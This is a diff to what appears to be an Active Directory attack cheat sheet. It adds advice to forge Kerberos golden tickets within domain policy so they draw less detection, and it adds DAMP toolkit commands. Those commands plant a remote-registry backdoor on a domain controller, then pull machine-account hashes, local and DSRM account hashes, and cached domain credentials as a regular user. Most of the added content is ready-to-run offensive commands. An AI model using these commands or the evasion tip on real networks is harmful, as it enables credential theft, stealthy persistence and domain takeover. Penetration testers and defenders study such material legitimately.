@@ -34,6 +34,12 @@
 * The krbtgt user hash could be used to impersonate any user with any privilege from even a non-domain machine
 * Password change (of krbtgt account)has no effect on this attack because previous hash will also be accpeted - you have to change the pw of krbtgt twice
 
+{% hint style="info" %}
+Always create Kerberos Tickets within the parameters of the Kerberos Domain Policy - less detection
+
+PowerView: (Get-DomainPolicy)."Kerberos Policy"
+{% endhint %}
+
 ### Requirements
 
 * krbtgt Hash has to be known
@@ -338,9 +344,7 @@ Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'\
 ### Requirements
 
 * Local Administrative rights on a system
-* On a DC you need DA rights
-
-
+* On a DC you need DA rights&#x20;
 
 ### Tools
 
@@ -379,6 +383,23 @@ Invoke-Command -scriptblock{whoami} -computername dchost.dc.local => Works
 
 **PSRemoting: On remote machine remove user1** \
 Set-RemotePSRemoting -username user1 -computername argethost.dom.local -remove
+
+**Using DAMP toolkit:**\
+**1.Remote Registry: Start using DAMP with domain admin privs on remote host**\
+Add-RemoteRegBackdoor -computername dchostname -Trustee username -verbose
+
+. .\RemoteHashRetrieval.ps1 (maybe replace $IV with $InitV) when there are errors with the following commands
+
+**2.Remote Registry: Retrieve machine account hash, as regular user**\
+Get-RemoteMachineAccountHash -computername dcname -verbose
+
+**2.Remote Registry: Retrieve local account hash, as regular user**\
+Get-RemoteLocaltAccountHash -computername dcname -verbose
+
+\=> DSRM account on DC
+
+**2.Remote Registry: Retrieve domain cached credentials, as regular user**\
+Get-RemoteCachedCredential -computername dcnmae -verbose
 
 
 
